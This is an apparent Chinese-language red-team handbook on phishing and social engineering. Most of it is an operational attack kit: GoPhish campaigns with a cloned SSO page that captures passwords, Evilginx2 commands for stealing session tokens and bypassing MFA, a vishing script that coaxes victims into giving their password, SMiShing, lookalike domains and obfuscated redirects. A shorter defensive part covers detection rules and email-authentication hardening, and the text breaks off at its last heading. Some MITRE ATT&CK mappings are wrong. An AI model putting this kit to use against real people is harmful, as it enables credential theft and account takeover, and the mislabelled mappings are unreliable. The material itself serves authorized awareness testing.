---
name: phishing-campaign
description: >
  钓鱼演练与社会工程学完整攻防手册：覆盖 GoPhish 部署与演练管理、鱼叉式钓鱼模板制作、
  预设话术电话（Pretext Calling）、Vishing/SMiShing 技术、凭据收集页面、社会工程学渗透测试。
  攻击侧涵盖完整钓鱼链路从侦察到报告；防御侧涵盖邮件网关检测规则、用户意识培训指标、
  钓鱼报告按钮实施、SPF/DKIM/DMARC 加固、GoPhish 结果分析与度量报告。含速查表和 MITRE ATT&CK 映射。
domain: cybersecurity
subdomain: offensive-security
tags: [phishing, gophish, spearphishing, social-engineering, vishing, pretexting, credential-harvesting, awareness-training]
version: 2.0.0
---

# 钓鱼演练与社会工程学 — 完整攻防手册

## 适用场景

- 使用 GoPhish 部署和执行钓鱼模拟演练
- 设计和执行鱼叉式钓鱼（Spearphishing）攻击链路
- 执行预设话术电话（Pretext Calling）和 Vishing 攻击
- 进行社会工程学渗透测试（含 SMiShing、物理社工）
- 构建凭据收集页面和 AiTM 攻击链路
- 分析钓鱼演练结果并生成用户意识度量报告
- 加固邮件认证（SPF/DKIM/DMARC）和钓鱼检测规则

**不适用**：钓鱼事件应急响应（见 `ir-phishing-response`）、恶意附件分析（见 `malware-analysis-static`）、C2 基础设施搭建（见 `red-team-engagement`）

## 前置条件

- 已签署演练授权书（SOW + ROE + 员工通知/豁免协议）
- GoPhish 或类似钓鱼框架部署环境（Linux VM / Docker）
- 目标组织邮件架构信息（MX 记录、邮件网关类型）
- OSINT 工具集（theHarvester, SpiderFoot, Hunter.io API）
- 电话/VoIP 工具（用于 Vishing 阶段）
- SIEM/邮件网关管理员权限（防御侧检测规则配置）

---

## Part A：攻击方法论

### 1. 识别与探测

#### 1.1 目标侦察与 OSINT 收集

钓鱼演练的效果取决于侦察质量。需要收集目标组织的人员、邮箱格式、技术栈、业务流程。

```bash
# 邮箱格式探测
theHarvester -d targetcompany.com -b google,bing,linkedin -l 500

# Hunter.io 批量获取邮箱格式和已验证邮箱
curl -s "https://api.hunter.io/v2/email-finder?domain=targetcompany.com&api_key=$HUNTER_API_KEY" | jq '.data'

# LinkedIn OSINT — 识别职位角色和组织架构
# 使用 LinkedIn 识别：IT 管理员（高价值目标）、HR（工资单钓鱼）、C 级高管（BEC）

# 邮件基础设施侦察
dig MX targetcompany.com +short
dig TXT targetcompany.com +short | grep -i spf
dig _dmarc.targetcompany.com TXT +short

# 技术栈识别（用于模板主题定制）
curl -sI https://targetcompany.com | grep -iE "server|x-powered-by"
whatweb https://targetcompany.com
```

#### 1.2 邮件认证态势分析

评估目标的 SPF/DKIM/DMARC 配置，判断哪些绕过技术可行：

```bash
# 完整邮件认证检查
python3 -m spoofscan targetcompany.com

# 或手动逐步检查
dig TXT targetcompany.com +short        # SPF
dig TXT _dmarc.targetcompany.com +short # DMARC
dig TXT selector._domainkey.targetcompany.com +short # DKIM

# 检查 DMARC 策略严格度
# p=none   → 可直接伪造域名发送
# p=quarantine → 进入垃圾箱概率高
# p=reject  → 必须使用子域名或相似域名策略
```

#### 1.3 社会工程学侦察矩阵

| 侦察维度 | 收集目标 | 工具/方法 | 钓鱼用途 |
|---------|---------|----------|---------|
| 人员身份 | 姓名、职位、邮箱 | LinkedIn, theHarvester | 鱼叉式钓鱼个性化 |
| 业务流程 | 审批流、报销流、IT 流程 | OSINT, Pretext call | 场景模板选择 |
| 技术栈 | OA 系统、邮件平台、VPN | whatweb, HTTP 头 | 登录页面仿制 |
| 组织文化 | 内部用语、管理层风格 | LinkedIn, 新闻稿 | 邮件语气匹配 |
| 物理设施 | 办公位置、门禁类型 | Google Maps, 实地勘察 | 物理社工准备 |

### 2. 利用与攻击

#### 2.1 GoPhish 完整部署（Docker）

```yaml
# docker-compose.yml — GoPhish 生产部署
version: '3.8'
services:
  gophish:
    image: gophish/gophish:latest
    container_name: gophish
    restart: unless-stopped
    ports:
      - "3333:3333"   # 管理界面
      - "8080:80"     # 钓鱼落地页
      - "587:587"     # SMTP（可选，推荐使用外部 SMTP）
    volumes:
      - gophish-data:/opt/gophish/data
      - ./config.json:/opt/gophish/config.json
    environment:
      - TZ=Asia/Shanghai

volumes:
  gophish-data:
```

```json
// config.json — GoPhish 配置
{
  "admin_server": {
    "listen_url": "0.0.0.0:3333",
    "use_tls": true,
    "cert_path": "gophish_admin.crt",
    "key_path": "gophish_admin.key",
    "trusted_origins": ["https://phishing-test.yourdomain.com"]
  },
  "phish_server": {
    "listen_url": "0.0.0.0:80",
    "use_tls": true,
    "cert_path": "phishing_server.crt",
    "key_path": "phishing_server.key"
  },
  "db_name": "sqlite3",
  "db_path": "gophish.db",
  "migrations_prefix": "db/db_"
}
```

```bash
# 启动 GoPhish
docker-compose up -d

# 获取初始管理员密码
docker logs gophish 2>&1 | grep "password"

# 访问管理界面
# https://<server-ip>:3333
```

#### 2.2 GoPhish 演练全流程操作

```bash
# ===== 步骤 1: 导入目标用户 =====
# CSV 格式: First Name,Last Name,Email,Position
cat > targets.csv << 'EOF'
First Name,Last Name,Email,Position
Zhang,San,zhangsan@targetcompany.com,IT Admin
Li,Si,lisi@targetcompany.com,HR Manager
Wang,Wu,wangwu@targetcompany.com,Finance Director
EOF

# 通过 API 导入
curl -k -X POST https://localhost:3333/api/groups/ \
  -H "Authorization: Bearer $GOPHISH_API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Q2-Phishing-Targets",
    "targets": [
      {"first_name": "Zhang", "last_name": "San", "email": "zhangsan@targetcompany.com", "position": "IT Admin"},
      {"first_name": "Li", "last_name": "Si", "email": "lisi@targetcompany.com", "position": "HR Manager"}
    ]
  }'

# ===== 步骤 2: 创建邮件模板 =====
curl -k -X POST https://localhost:3333/api/templates/ \
  -H "Authorization: Bearer $GOPHISH_API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "IT-Password-Reset",
    "subject": "【紧急】IT部门：您的密码将在24小时后过期",
    "html": "<html><body><p>尊敬的 {{.FirstName}}，</p><p>根据公司IT安全策略，您的域账户密码将在24小时后过期。请立即点击下方链接更新密码：</p><p><a href=\"{{.URL}}\">更新密码</a></p><p>IT部门<br/>技术支持中心</p></body></html>",
    "text": "尊敬的 {{.FirstName}}，根据公司IT安全策略，您的域账户密码将在24小时后过期。请立即访问以下链接更新密码：{{.URL}}",
    "modify_headers": [
      {"key": "X-Priority", "value": "1"},
      {"key": "X-Mailer", "value": "Microsoft Outlook 16.0"}
    ]
  }'

# ===== 步骤 3: 创建钓鱼页面 =====
# 将目标 OA/VPN 登录页面克隆为钓鱼页面
curl -k -X POST https://localhost:3333/api/pages/ \
  -H "Authorization: Bearer $GOPHISH_API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "SSO-Login-Clone",
    "html": "<html><head><title>SSO 登录</title></head><body><form action=\"\" method=\"POST\"><input name=\"username\" placeholder=\"用户名\"/><input name=\"password\" type=\"password\" placeholder=\"密码\"/><button type=\"submit\">登录</button></form><script>document.forms[0].action=\"/api/v1/credentials\";</script></body></html>",
    "capture_credentials": true,
    "capture_passwords": true,
    "redirect_url": "https://sso.targetcompany.com/login/error?msg=session_expired"
  }'

# ===== 步骤 4: 配置发送配置 =====
curl -k -X POST https://localhost:3333/api/smtp/ \
  -H "Authorization: Bearer $GOPHISH_API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "IT-Dept-Sender",
    "host": "smtp.yourdomain.com:587",
    "from_address": "it-support@yourdomain.com",
    "username": "it-support@yourdomain.com",
    "password": "your-smtp-password",
    "ignore_cert_errors": false,
    "headers": [
      {"key": "X-Mailer", "value": "Microsoft Outlook 16.0"},
      {"key": "Reply-To", "value": "it-helpdesk@targetcompany.com"}
    ]
  }'

# ===== 步骤 5: 创建并启动演练 =====
curl -k -X POST https://localhost:3333/api/campaigns/ \
  -H "Authorization: Bearer $GOPHISH_API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Q2-2025-Password-Reset-Campaign",
    "group_id": 1,
    "template_id": 1,
    "page_id": 1,
    "smtp_id": 1,
    "launch_date": "2025-06-15T09:00:00+08:00",
    "send_by_date": "2025-06-16T18:00:00+08:00",
    "url": "https://phishing-test.yourdomain.com/reset-password"
  }'

# ===== 步骤 6: 查询演练结果 =====
curl -k https://localhost:3333/api/campaigns/1/summary \
  -H "Authorization: Bearer $GOPHISH_API_KEY" | jq .
```

#### 2.3 鱼叉式钓鱼模板制作

**高成功率模板类型与话术：**

| 模板类型 | 主题行示例 | 目标角色 | 预期点击率 |
|---------|-----------|---------|-----------|
| IT 密码重置 | 【紧急】IT部门：密码即将过期 | 全员 | 35-50% |
| HR 工资单 | 6月工资条已出，请查收 | 全员 | 40-55% |
| 文档共享 | XX总分享了文档「Q2业绩报告」 | 管理/销售 | 30-45% |
| IT 软件更新 | VPN紧急安全更新 — 立即安装 | IT/远程办公 | 25-40% |
| 包裹通知 | 您有一件快递待签收 | 全员 | 20-35% |
| 法务/合规 | 合规审查要求 — 需要您的确认 | 管理层 | 25-40% |

**鱼叉式钓鱼模板 — HR 工资单场景：**

```html
<!-- 高仿真 HTML 模板 -->
<!DOCTYPE html>
<html>
<head>
<style>
body { font-family: 'Microsoft YaHei', Arial, sans-serif; color: #333; }
.email-container { max-width: 600px; margin: 0 auto; padding: 20px; }
.header { background-color: #1a73e8; color: white; padding: 15px 20px; border-radius: 4px 4px 0 0; }
.content { padding: 20px; border: 1px solid #e0e0e0; border-top: none; }
.btn { display: inline-block; background-color: #1a73e8; color: white; padding: 12px 24px; text-decoration: none; border-radius: 4px; }
.footer { color: #999; font-size: 12px; margin-top: 20px; padding-top: 10px; border-top: 1px solid #eee; }
</style>
</head>
<body>
<div class="email-container">
  <div class="header">
    <strong>人力资源部</strong> — 工资通知
  </div>
  <div class="content">
    <p>{{.FirstName}} 您好，</p>
    <p>您的 <strong>{{.CurrentMonth}}月工资条</strong> 已生成。请登录 HR 自助平台查看详细信息。</p>
    <p>如对工资明细有疑问，请联系 HR 部门（分机 8012）。</p>
    <p style="text-align: center; margin: 25px 0;">
      <a href="{{.URL}}" class="btn">查看工资条</a>
    </p>
    <p style="color: #666; font-size: 13px;">此邮件由系统自动发送，请勿直接回复。</p>
  </div>
  <div class="footer">
    <p>人力资源部 | targetcompany.com | 保密信息，仅限本人查看</p>
  </div>
</div>
<!-- 跟踪像素 -->
<img src="{{.TrackingURL}}" width="1" height="1" style="display:none;">
</body>
</html>
```

#### 2.4 AiTM 凭据收集与 MFA 绕过（Evilginx2）

```bash
# Evilginx2 — AiTM 钓鱼代理（绕过 MFA）
# 安装
sudo apt install evilginx2

# 配置域名和 DNS
# 将钓鱼域名的 NS 记录指向 Evilginx2 服务器
evilginx2

# 内置命令
: config domain phishing-test.yourdomain.com
: config ip <YOUR_SERVER_IP>
: phishlets get oidc          # 获取 OIDC/Office 365 钓鱼模块
: phishlets hostname oidc sso-login.phishing-test.yourdomain.com
: phishlets enable oidc

# 创建钓鱼会话
: lures create oidc
: lures edit 0 path /secure-login
: lures edit 0 redirect_url https://login.microsoftonline.com/
: lures get-url 0             # 获取钓鱼链接

# 获取的凭据和 session token 会自动捕获
: sessions                    # 查看捕获的会话
```

#### 2.5 预设话术电话（Pretext Calling）

**Vishing 攻击脚本模板 — IT 支持角色：**

```
=== Vishing 脚本：IT 帮助台 — 密码重置 ===

【准备阶段】
- 来电显示伪装：使用 VoIP 服务设置来电显示为 IT 部门分机号
- 目标信息卡：姓名、工号、部门（来自前期 OSINT）

【开场白】
"您好，请问是 {目标姓名} 吗？我是 IT 部的 {假名}，工号 {假工号}。"

【建立信任 — 30秒】
"我们在做季度的 AD 账户安全审计，系统显示您的账户在异地登录次数异常，
 需要确认一下您最近是否在 {远端城市} 登录过？"

【如果目标说没有 → 制造紧迫感】
"这就对了，我们的 IDS 检测到有人在使用您的凭据尝试登录 VPN。
 我现在需要帮您紧急重置密码，整个过程大概2分钟。"

【信息收集 — 逐步请求】
1. "首先确认一下，您的用户名是 {从OSINT已知} 对吧？"  ← 确认已知信息增加信任
2. "好的，为了验证身份，请您告诉我当前的密码，我来核对是否被泄露。"
   ❌ 理想结果：目标说出密码
   ⚠️ 如果拒绝：转入备用话术

【备用话术 — 如果拒绝给密码】
"理解您的顾虑，这是好的安全意识。那这样，我发一个验证码到您的手机，
 您告诉我验证码就行，我来后台操作。"
 → 发送钓鱼短信 + 验证码页面

【结束】
"好的，密码已经重置完成，新密码会通过企业微信发给您。
 感谢配合，有任何问题随时联系我们。"
```

#### 2.6 SMiShing（短信钓鱼）

```bash
# SMiShing 工具 — 使用 SMS API 发送钓鱼短信
curl -X POST "https://api.twilio.com/2010-04-01/Accounts/$TWILIO_SID/Messages.json" \
  -u "$TWILIO_SID:$TWILIO_AUTH_TOKEN" \
  -d "From=+1XXXXXXXXXX" \
  -d "Body=【IT通知】您的VPN证书即将过期，请立即更新：https://vpn-update.phishing-test.yourdomain.com" \
  -d "To=+86XXXXXXXXXX"
```

### 3. 工具使用

#### 3.1 工具矩阵

| 工具 | 用途 | 部署方式 | 适用场景 |
|------|------|---------|---------|
| GoPhish | 钓鱼演练管理 | Docker/Binary | 钓鱼模拟演练、凭据收集 |
| Evilginx2 | AiTM 代理 | Binary | MFA 绕过、Session 劫持 |
| SET | 社工工具包 | Kali 内置 | 快速钓鱼页面、载荷投递 |
| King Phisher | 企业级钓鱼平台 | Python/PostgreSQL | 大规模演练 |
| SocialFish | 移动端钓鱼 | Python/Flask | 简易钓鱼页面 |
| Go_DomainPhish | 域名相似度检测 | Go | 识别可注册的相似域名 |

#### 3.2 SET (Social Engineering Toolkit) 快速使用

```bash
# 启动 SET
sudo setoolkit

# 选择: 1) Social-Engineering Attacks
# 选择: 2) Website Attack Vectors
# 选择: 3) Credential Harvester Attack Method
# 选择: 2) Site Cloner

# 输入钓鱼页面 IP 和要克隆的 URL
set:webattack> IP address for the POST back in Harvester: <YOUR_IP>
set:webattack> Enter the url to clone: https://sso.targetcompany.com/login

# 凭据会自动保存到 /root/.set/reports/
```

### 4. 绕过技术

#### 4.1 邮件过滤器绕过策略

```bash
# 策略 1: 子域名伪装（当 DMARC p=reject 时）
# 注册相似域名
# targetcompany.com → targetcompnay.com (字母换位)
# targetcompany.com → targetcompany-security.com (添加安全关键词)

# 策略 2: SPF 对齐绕过
# 使用允许的第三方邮件服务（若 SPF 记录包含 include:third-party.com）
dig TXT targetcompany.com | grep spf
# "v=spf1 include:_spf.google.com include:mailchimp.com ~all"
# → 可通过 Mailchimp/Google 发送，通过 SPF 对齐检查

# 策略 3: 链接混淆
# URL 编码
https://phish.com/%70%61%79%6C%6F%61%64
# 子目录深度
https://legitimate-looking-domain.com/shared-docs/Q2-Report-2025/login
# 开放重定向利用
https://legitimate-site.com/redirect?url=https://phishing-site.com
```

#### 4.2 载荷编码与链接混淆

```bash
# HTML 实体编码 — 隐藏真实 URL
python3 -c "
url = 'https://phishing-test.yourdomain.com/login'
encoded = ''.join(f'&#x{ord(c):02x};' for c in url)
print(encoded)
"

# JavaScript 重定向（在邮件 HTML 中）
<script>window.location.href=atob('aHR0cHM6Ly9waGlzaGluZy10ZXN0LnlvdXJkb21haW4uY29t');</script>

# 使用缩短 URL 服务
curl -s "https://api-ssl.bitly.com/v4/shorten" \
  -H "Authorization: Bearer $BITLY_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"long_url": "https://phishing-test.yourdomain.com/login"}'
```

---

## Part B：检测与防御

### 5. 检测规则

#### 5.1 Sigma 检测规则 — 钓鱼相关指标

```yaml
# 鱼叉式钓鱼邮件检测 — 异常发件人模式
title: Suspicious Spearphishing Email Pattern
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
status: production
logsource:
    category: email
    product: email_gateway
detection:
    selection:
        subject|contains:
            - '密码即将过期'
            - '紧急安全更新'
            - '工资条'
            - '文档共享'
            - '快递签收'
    filter_legitimate:
        sender_domain|endswith: 'targetcompany.com'
    condition: selection and not filter_legitimate
level: medium
tags:
    - attack.initial_access
    - attack.t1566.001
```

```yaml
# 凭据收集页面检测 — 异常登录 URL
title: Credential Harvesting Page Detected
id: b2c3d4e5-f6a7-8901-bcde-f12345678901
status: production
logsource:
    category: proxy
    product: web_proxy
detection:
    selection:
        c-uri|contains:
            - '/reset-password'
            - '/secure-login'
            - '/verify-account'
            - '/update-credentials'
    filter_legitimate:
        c-uri|contains:
            - 'sso.targetcompany.com'
            - 'portal.targetcompany.com'
    suspicious_domain:
        cs-host|endswith:
            - '.tk'
            - '.ml'
            - '.ga'
            - '.cf'
    condition: (selection and not filter_legitimate) or suspicious_domain
level: high
tags:
    - attack.credential_access
    - attack.t1189
```

```yaml
# 邮件转发规则异常 — 攻陷指标
title: Suspicious Email Forwarding Rule Created
id: c3d4e5f6-a7b8-9012-cdef-123456789012
status: production
logsource:
    product: exchange
    service: exchange
detection:
    selection:
        event_id: 'New-InboxRule'
        action|contains:
            - 'ForwardTo'
            - 'RedirectTo'
    filter_legitimate:
        target|endswith: 'targetcompany.com'
    condition: selection and not filter_legitimate
level: critical
tags:
    - attack.persistence
    - attack.t1137.001
```

#### 5.2 Vishing 指标检测

```yaml
# 异常密码重置请求 — 可能的 Vishing 后果
title: Anomalous Password Reset Request Spike
id: d4e5f6a7-b8c9-0123-defa-234567890123
status: experimental
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4724  # 密码重置
    timeframe: 1h
    condition: selection | count() > 10
level: medium
```

### 6. 修复方案

#### 6.1 SPF/DKIM/DMARC 完整加固配置

```bash
# ===== SPF (Sender Policy Framework) =====
# 严格 SPF 记录 — 仅允许指定 IP 和服务发送
targetcompany.com. IN TXT "v=spf1 ip4:203.0.113.0/24 include:_spf.google.com include:mailchimp.com -all"

# 关键参数说明:
# ip4:203.0.113.0/24  → 允许的邮件服务器 IP 段
# include:_spf.google.com → 允许 Google Workspace 发送
# -all → 硬拒绝（未授权的发送源直接拒绝）
# ⚠️ 避免使用 ~all（软拒绝）或 +all（允许所有）

# ===== DKIM (DomainKeys Identified Mail) =====
# 生成 DKIM 密钥对
openssl genrsa -out dkim-private.key 2048
openssl rsa -in dkim-private.key -pubout -out dkim-public.key

# DKIM DNS 记录
selector._domainkey.targetcompany.com. IN TXT (
  "v=DKIM1; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA..."
)

# 在邮件服务器配置 DKIM 签名（Postfix + OpenDKIM）
# /etc/opendkim.conf
cat >> /etc/opendkim.conf << 'EOF'
Domain                  targetcompany.com
KeyFile                 /etc/opendkim/keys/dkim-private.key
Selector                selector
Socket                  inet:8891@localhost
Canonicalization        relaxed/relaxed
Mode                    sv
EOF

# ===== DMARC =====
# 分阶段部署 DMARC
# 阶段1: 监控模式（收集数据）
_dmarc.targetcompany.com. IN TXT "v=DMARC1; p=none; rua=mailto:dmarc-reports@targetcompany.com; ruf=mailto:dmarc-forensic@targetcompany.com; fo=1; adkim=s; aspf=s"

# 阶段2: 隔离模式（验证1-2周后）
_dmarc.targetcompany.com. IN TXT "v=DMARC1; p=quarantine; pct=25; rua=mailto:dmarc-reports@targetcompany.com; adkim=s; aspf=s"

# 阶段3: 拒绝模式（完全保护）
_dmarc.targetcompany.com. IN TXT "v=DMARC1; p=reject; rua=mailto:dmarc-reports@targetcompany.com; adkim=s; aspf=s"
```

#### 6.2 钓鱼报告按钮实现

```javascript
// Outlook 加载项 — 钓鱼报告按钮（manifest.xml + 函数）
// 简化版本，部署到 Exchange 组织

// report-phishing.js
function reportPhishing(event) {
    const item = Office.context.mailbox.item;
    const ewsUrl = Office.context.mailbox.ewsUrl;

    // 获取邮件头和正文
    const headers = item.internetHeaders;
    const subject = item.subject;
    const sender = item.sender.emailAddress;

    // 发送到 SOC 钓鱼报告 API
    fetch('https://soc-api.targetcompany.com/api/v1/phishing-report', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + getSASToken() },
        body: JSON.stringify({
            subject: subject,
            sender: sender,
            recipient: Office.context.mailbox.userProfile.emailAddress,
            internet_headers: headers,
            reported_at: new Date().toISOString(),
            mail_item_id: item.itemId
        })
    })
    .then(response => response.json())
    .then(data => {
        // 将邮件移动到垃圾箱
        item.close();
        Office.context.ui.messageParent('reported');
    });

    event.completed();
}
```

#### 6.3 GoPhish 演练结果分析与度量报告

```bash
# 导出演练结果（GoPhish API）
curl -k https://localhost:3333/api/campaigns/1/results \
  -H "Authorization: Bearer $GOPHISH_API_KEY" | jq '.'

# 生成度量报告脚本
python3 << 'PYEOF'
import json, requests

API = "https://localhost:3333/api"
KEY = "YOUR_API_KEY"
HEADERS = {"Authorization": f"Bearer {KEY}"}
campaign_id = 1

# 获取演练数据
r = requests.get(f"{API}/campaigns/{campaign_id}", headers=HEADERS, verify=False)
data = r.json()

total = len(data["results"])
opened = sum(1 for r in data["results"] if r["status"] == "Email Opened")
clicked = sum(1 for r in data["results"] if r["status"] == "Clicked Link")
submitted = sum(1 for r in data["results"] if r["status"] == "Submitted Data")
reported = sum(1 for r in data["results"] if r["reported"])

print(f"=== 钓鱼演练报告 — {data['name']} ===")
print(f"总目标数:        {total}")
print(f"邮件已发送:      {data['stats']['total']}")
print(f"邮件已打开:      {opened} ({opened/total*100:.1f}%)")
print(f"链接已点击:      {clicked} ({clicked/total*100:.1f}%)")
print(f"凭据已提交:      {submitted} ({submitted/total*100:.1f}%)")
print(f"已报告钓鱼:      {reported} ({reported/total*100:.1f}%)")
print(f"")
print(f"整体点击率 (CTR):   {clicked/total*100:.1f}%")
print(f"凭据提交率:         {submitted/total*100:.1f}%")
print(f"报告率 (正向指标):  {reported/total*100:.1f}%")
print(f"")
print(f"点击→提交转化率:    {submitted/clicked*100:.1f}%" if clicked > 0 else "")

# 行业基准参考
print(f"\n=== 行业基准对比 ===")
print(f"本演练点击率:   {clicked/total*100:.1f}%")
print(f"行业平均点击率: 18.8% (KnowBe4 2024 报告)")
print(f"行业最佳实践:   < 5%")
PYEOF
```

#### 6.4 安全意识培训方案设计

```
=== 钓鱼演练驱动的安全意识培训方案 ===

【培训频率】
- 基线测试：首次全量钓鱼测试（无预警）
- 季度演练：每季度一次不同场景的钓鱼测试
- 月度微课：每月一封安全提示邮件（2分钟阅读）

【分层培训策略】

| 风险等级 | 点击行为 | 培训措施 |
|---------|---------|---------|
| 高风险 | 点击+提交凭据 | 1对1安全谈话 + 30分钟互动课程 + 即时反馈 |
| 中风险 | 点击但未提交 | 5分钟微学习视频 + 即时反馈 |
| 低风险 | 报告/忽略 | 正向激励（积分/认可） |

【演练场景轮换计划】

| 季度 | 场景 | 模板类型 | 难度 |
|------|------|---------|------|
| Q1 | IT 密码重置 | 标准钓鱼 | ★★☆ |
| Q2 | HR 工资单 | 鱼叉式 | ★★★ |
| Q3 | 文档共享 | 品牌仿冒 | ★★★ |
| Q4 | 高管仿冒(BEC) | 深度定制 | ★★★★ |

【度量指标 — 演练效果追踪】

KPI 指标:
- 点击率 (Click Rate): 每季度应下降 15-20%
- 凭据提交率 (Credential Submission Rate): 目标 < 3%
- 报告率 (Report Rate): 每季度应上升 10%
- 报告速度 (Time to Report): 目标 < 5 分钟
- 培训完成率: 目标 > 95%
```

---

## 速查表

### 社会工程学攻击决策树

```
目标环境分析
├── 邮件认证弱 (SPF/DKIM/DMARC 缺失或 p=none)
│   ├── 直接域名伪造 → GoPhish 标准钓鱼
│   └── 子域名钓鱼 → Evilginx2 AiTM
├── 邮件认证强 (DMARC p=reject)
│   ├── 相似域名注册 → GoPhish + 新域名
│   ├── 第三方服务滥用 → 通过合法服务发送
│   └── 转向非邮件渠道 → SMiShing / Vishing
├── 目标为普通员工
│   └── 通用模板（IT 通知、包裹、工资单）
├── 目标为管理层
│   └── 深度定制的鱼叉式（BEC、合规审查）
└── 需要绕过 MFA
    └── Evilginx2 AiTM + 实时会话代理
```

### GoPhish API 速查

| 操作 | 方法 | 端点 |
|------|------|------|
| 列出演练 | GET | `/api/campaigns/` |
| 创建演练 | POST | `/api/campaigns/` |
| 演练摘要 | GET | `/api/campaigns/{id}/summary` |
| 演练结果 | GET | `/api/campaigns/{id}/results` |
| 导入用户组 | POST | `/api/groups/` |
| 创建模板 | POST | `/api/templates/` |
| 创建页面 | POST | `/api/pages/` |
| 配置 SMTP | POST | `/api/smtp/` |
| 删除演练 | DELETE | `/api/campaigns/{id}` |

### 钓鱼模板安全检查清单

```
□ 主题行紧迫感适度（过于紧迫会触发过滤器）
□ 发件人显示名使用目标语言
□ HTML 样式与目标品牌一致
□ 包含 {{.FirstName}} 个性化变量
□ 包含 {{.URL}} 跟踪链接
□ 包含跟踪像素 ({{.TrackingURL}})
□ 纯文本版本已配置（避免 Spam 评分）
□ 自定义 X-Mailer / X-Priority 头部
□ 落地页面克隆自真实站点
□ capture_credentials = true
□ redirect_url 指向合理目标
□ SMTP 配置正确（SPF/DKIM 对齐）
□ 发送前使用 mail-tester.com 检查 Spam 评分
□ 预览模式测试所有链接
```

### 邮件认证配置矩阵

| 认证机制 | DNS 记录类型 | 推荐配置 | 安全等级 |
|---------|-------------|---------|---------|
| SPF | TXT | `v=spf1 ip4:X.X.X.X -all` | 基础 |
| DKIM | TXT | `v=DKIM1; k=rsa; p=<pubkey>` 2048-bit | 中等 |
| DMARC | TXT | `v=DMARC1; p=reject; adkim=s; aspf=s` | 高 |
| BIMI | TXT | `v=BIMI1; l=https://brand.com/logo.svg` | 增强（品牌标识） |

---

## MITRE ATT&CK 映射

| Tactic | Technique | ID | 本手册覆盖 |
|--------|-----------|-----|-----------|
| Initial Access | Phishing: Spearphishing Attachment | T1566.001 | 鱼叉式钓鱼模板制作 |
| Initial Access | Phishing: Spearphishing Link | T1566.002 | GoPhish 链接钓鱼 |
| Initial Access | Phishing: Spearphishing via Service | T1566.003 | 第三方服务钓鱼 |
| Credential Access | Phishing for Credentials | T1189 | 凭据收集页面 |
| Credential Access | Adversary-in-the-Middle | T1557 | Evilginx2 AiTM |
| Defense Evasion | Obfuscated Files | T1027 | URL/载荷编码 |
| Discovery | Email Collection | T1114 | 邮件转发规则 |
| Persistence | Office Application Startup | T1137 | 邮件规则持久化 |
| Collection | Data from Information Repositories | T1213 | 邮件数据收集 |

---

## Part C：2025-2026 威胁演进与前沿补充

### C.1 PhaaS 工业化生态 — 新兴平台矩阵

钓鱼即服务(PhaaS)在 2025-2026 进入工业化阶段，平台化运营使攻击门槛降至接近零。

**SniperDz PhaaS (2026-06 Group-IB 披露)**
- 中心化 PhaaS 平台，拥有 **80+ 即用钓鱼模板**，冒充 **30+ 全球品牌**
- 涵盖品牌冒充→浏览器劫持→CPA 欺诈完整攻击链
- 支持自定义域名绑定和反检测配置

**Error 524 Smishing PhaaS (2025 H2 活跃)**
- 冒充 **267+ 独立品牌**，覆盖 **72 个国家**，生成 **4,389 个钓鱼域名实例**
- 技术特征：
  - 伪造 Cloudflare Error 524 页面作为诱饵
  - Base64 混淆 SPA (Single Page Application)
  - 加密 WebSocket 通道实时窃取信用卡数据
  - 地理围栏 + 设备指纹过滤，仅特定目标可见钓鱼内容
  - ~30% 基础设施托管在腾讯云/阿里云美国区域，前端用 Cloudflare 掩盖真实 IP
- 墨西哥占比最高(1,851 域名, 42%)

**GTFire 钓鱼方案 (2026-02 Group-IB 披露)**
- 滥用 Google Firebase (`*.web.app`) 托管钓鱼页面
- 使用 Google Translate (`translate.goog`) 作为中间重定向层绕过 URL 过滤器
- 影响 **1,000+ 组织**，覆盖 **100+ 国家**
- 技术特征：大量随机注册 `*.web.app` 子域名、动态加载品牌特定登录模板、多步骤凭据收集

**2025-2026 PhaaS 平台活跃矩阵**

| 平台 | 活跃期 | 类型 | 核心能力 | 目标区域 | 来源 |
|------|--------|------|---------|---------|------|
| Tycoon 2FA | 2024-2026 | AiTM | MFA 绕过,反检测 | 全球 | Cloudflare+Microsoft 联合打击 |
| Sneaky 2FA | 2024-2025 | AiTM | Microsoft 365 凭证窃取 | 全球 | 多家安全厂商追踪 |
| SniperDz | 2026 | 综合 | 80+模板,30+品牌 | 全球 | Group-IB 2026-06 |
| Error 524 | 2025 H2- | Smishing | 267+品牌,加密WS | 72国(拉美为主) | Group-IB 2026-06 |
| GTFire | 2025-2026 | 基础设施滥用 | Firebase+Translate | 100+国 | Group-IB 2026-02 |
| Dadsec PhaaS | 2024-2025 | 综合 | 多渠道钓鱼 | 全球 | FBI IC3 PSA |
| Kali365 | 2025 | 新兴 | 全年运营 | 全球 | 威胁情报 |

### C.2 Evilginx 生态演进 — 开源 v3.3 + Pro 商业版

**Evilginx 开源版演进路线 (v2.x → v3.3.0)**

| 版本 | 关键变更 | 安全意义 |
|------|---------|---------|
| v3.0.0 | LetsEncrypt 自动续期;Token 从 body/headers 捕获(不仅 cookie);配置 YAML→JSON;Phishlet 模板系统 | 更灵活的 token 窃取方式 |
| v3.2.0 | Token 捕获后动态 URL 重定向;Lure 暂停功能;intercept 段拦截请求;JS 注入改为外部引用 | 攻击链更隐蔽 |
| v3.3.0 | GoPhish 官方集成;自定义 TLS 证书;反向代理后正确识别源 IP;`__Host-`/`__Secure-` cookie 支持 | 生产级部署 |

```bash
# Evilginx 3.3 — GoPhish 集成 (Kuba Gretzky fork)
# 使用专用 fork: https://github.com/kgretzky/gophish/
# 博客: https://breakdev.org/evilginx-3-3-go-phish/

# 在 Evilginx 中创建 lure 后，获取钓鱼 URL
: lures get-url 0
# 将此 URL 嵌入 GoPhish 邮件模板的 {{.URL}} 变量

# GoPhish 中配置:
# Landing Page → redirect_url 设为 Evilginx 的钓鱼域名
# SMTP → 正常配置发送渠道
# 邮件模板中 {{.URL}} 指向 Evilginx lure URL
```

**Evilginx Pro 商业版 (2025-03 发布)**

